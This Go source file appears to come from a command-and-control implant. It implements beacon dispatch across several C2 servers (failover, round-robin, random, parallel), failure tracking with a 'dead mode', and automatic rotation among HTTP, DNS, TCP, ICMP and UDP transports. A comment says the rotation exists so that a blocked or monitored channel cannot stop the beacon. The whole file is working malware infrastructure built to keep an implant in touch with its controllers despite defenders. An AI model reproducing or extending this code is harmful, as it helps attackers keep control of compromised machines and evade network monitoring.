//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	mathRand "math/rand"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ?? Multi-C2 mode dispatch ???????????????????????????????????????????????

func sendWithMode(body []byte) []byte {
	urls := c2URLsSnapshot()
	if atomic.LoadInt32(&deadMode) == 1 {
		if time.Since(deadModeStart) > deadTimeout {
			atomic.StoreInt32(&deadMode, 0)
			if Debug {
				fmt.Println("[c2] Dead mode timeout expired, retrying...")
			}
		} else {
			return nil
		}
	}

	switch c2Mode {
	case C2ModeFailover:
		for i := 0; i < len(urls); i++ {
			idx := (int(currentC2Idx.Load()) + i) % len(urls)
			resp := sendToC2(idx, body)
			if resp != nil {
				recordSuccess(idx)
				currentC2Idx.Store(int32(idx))
				return resp
			}
			recordFailure(idx)
		}
		checkAllDead()
		return nil

	case C2ModeRoundRobin:
		currentC2Idx.Store(int32((int(currentC2Idx.Load()) + 1) % len(urls)))
		resp := 	sendToC2(int(currentC2Idx.Load()), body)
		if resp != nil {
			recordSuccess(int(currentC2Idx.Load()))
			return resp
		}
		recordFailure(int(currentC2Idx.Load()))
		checkAllDead()
		return nil

	case C2ModeRandom:
		idx := mathRand.Intn(len(urls))
		currentC2Idx.Store(int32(idx))
		resp := sendToC2(idx, body)
		if resp != nil {
			recordSuccess(idx)
			return resp
		}
		recordFailure(idx)
		return nil

	case C2ModeSplit:
		bestIdx := 0
		bestFails := int(^uint(0) >> 1)
		for i := range urls {
			c2StatsMu.Lock()
			stats := c2Stats[i]
			c2StatsMu.Unlock()
			fails := 0
			if stats != nil {
				fails = stats.consecutive
			}
			if fails < bestFails {
				bestFails = fails
				bestIdx = i
			}
		}
		currentC2Idx.Store(int32(bestIdx))
		resp := sendToC2(bestIdx, body)
		if resp != nil {
			recordSuccess(bestIdx)
			return resp
		}
		recordFailure(bestIdx)
		checkAllDead()
		return nil

	case C2ModeParallel:
		type parResp struct {
			data []byte
			idx  int
		}
		ch := make(chan parResp, len(urls))
		for i := range urls {
			idx := i
			go func() {
				data := sendToC2(idx, body)
				ch <- parResp{data, idx}
			}()
		}
		hasFailure := false
		for i := 0; i < len(urls); i++ {
			r := <-ch
			if r.data != nil {
				recordSuccess(r.idx)
				currentC2Idx.Store(int32(r.idx))
				return r.data
			}
			recordFailure(r.idx)
			hasFailure = true
		}
		if hasFailure {
			checkAllDead()
		}
		return nil

	default:
		resp := 	sendToC2(int(currentC2Idx.Load()), body)
		if resp != nil {
			recordSuccess(int(currentC2Idx.Load()))
			return resp
		}
		recordFailure(int(currentC2Idx.Load()))
		checkAllDead()
		return nil
	}
}

func recordFailure(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures++
	stats.consecutive++
	stats.lastFailure = time.Now()
}

func recordSuccess(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures = 0
	stats.consecutive = 0
}

func checkAllDead() {
	urls := c2URLsSnapshot()
	if len(urls) == 0 || maxRetries <= 0 {
		return
	}
	c2StatsMu.Lock()
	allDead := true
	for i := range urls {
		stats := c2Stats[i]
		if stats == nil || stats.consecutive < maxRetries {
			allDead = false
			break
		}
	}
	if allDead {
		atomic.StoreInt32(&deadMode, 1)
		deadModeStart = time.Now()
		if Debug {
			fmt.Println("[!] All C2s unreachable, entering dead mode")
		}
	}
	c2StatsMu.Unlock()
}

// Cross-transport failover. If the active transport keeps failing, rotate to
// the next configured transport (HTTP<->DNS<->TCP<->ICMP) so a blocked or
// monitored channel cannot silently kill the beacon. Candidates are derived
// from what the agent actually has configured, so we never switch to a
// transport that lacks its setup (e.g. DNS without a DNSDomain/DNSServer).
var (
	transportFailStreak   int32
	currentTransportIdx   int32
	transportCandidates   []string
	transportCandidatesMu sync.Mutex
)

func effectiveTransport() string {
	switch {
	case Protocol == "tcp":
		return "tcp"
	case Protocol == "dns":
		return "dns"
	case Protocol == "icmp":
		return "icmp"
	case Protocol == "udp":
		return "udp"
	case BeaconTransport == "wss":
		return "wss"
	case BeaconTransport == "grpc":
		return "grpc"
	case BeaconTransport == "ssh":
		return "ssh"
	case BeaconTransport == "mtls":
		return "mtls"
	case BeaconTransport == "h2c":
		return "h2c"
	default:
		return "http"
	}
}

func buildTransportCandidates() []string {
	primary := effectiveTransport()
	cands := []string{primary}
	add := func(t string) {
		for _, c := range cands {
			if c == t {
				return
			}
		}
		cands = append(cands, t)
	}
	// HTTP is the universal fallback (only needs a C2URL).
	add("http")
	// DNS only when its dedicated config is present.
	if DNSDomain != "" && DNSServer != "" {
		add("dns")
	}
	// TCP/ICMP are always technically reachable once a host resolves.
	add("tcp")
	add("icmp")
	// UDP is reachable whenever a udp:// C2 endpoint is configured.
	if strings.HasPrefix(C2URL, "udp://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "udp://") {
		add("udp")
	}
	return cands
}

func getTransportCandidates() []string {
	transportCandidatesMu.Lock()
	defer transportCandidatesMu.Unlock()
	if transportCandidates == nil {
		transportCandidates = buildTransportCandidates()
	}
	return transportCandidates
}

// applyTransport switches the active transport by setting the globals the
// beacon dispatcher keys on.
func applyTransport(name string) {
	switch name {
	case "tcp":
		Protocol, BeaconTransport = "tcp", "tcp"
	case "dns":
		Protocol, BeaconTransport = "dns", "dns"
	case "icmp":
		Protocol, BeaconTransport = "icmp", "icmp"
	case "udp":
		Protocol, BeaconTransport = "udp", "udp"
	default:
		Protocol, BeaconTransport = "http", "http"
	}
}

// maybeRotateTransport is invoked after a failed beacon. Once the consecutive
// failure count reaches the threshold it advances to the next candidate and
// resets the counter. noteTransportSuccess clears the counter on any success.
func maybeRotateTransport() {
	streak := atomic.AddInt32(&transportFailStreak, 1)
	if streak < dnsFallbackThreshold {
		return
	}
	cands := getTransportCandidates()
	if len(cands) <= 1 {
		atomic.StoreInt32(&transportFailStreak, 0)
		return
	}
	cur := effectiveTransport()
	idx := int(atomic.LoadInt32(&currentTransportIdx))
	next := cur
	for i := 0; i < len(cands); i++ {
		idx = (idx + 1) % len(cands)
		candidate := cands[idx]
		if candidate != cur {
			next = candidate
			break
		}
	}
	atomic.StoreInt32(&currentTransportIdx, int32(idx))
	applyTransport(next)
	atomic.StoreInt32(&transportFailStreak, 0)
	if Debug {
		fmt.Printf("[c2] transport failover -> %s after %d consecutive failures\n", next, streak)
	}
}

func noteTransportSuccess() {
	atomic.StoreInt32(&transportFailStreak, 0)
}
